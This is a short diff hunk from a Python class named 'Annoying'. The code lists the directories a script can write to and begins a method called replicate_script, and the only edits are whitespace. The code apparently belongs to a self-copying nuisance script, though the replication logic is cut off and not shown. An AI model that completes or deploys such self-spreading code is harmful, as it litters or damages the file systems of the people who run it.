@@ -23,10 +23,10 @@ class Annoying:
                 # Check if the script has permission to write to the directory
                 if os.access(directory, os.W_OK):
                     # Add the directory to the list of writable directories
-                    writable_directories.append(directory)
-                    
+                    writable_directories.append(directory)         
 
         return writable_directories
+
     def replicate_script(self):
         
         # Generate a random number
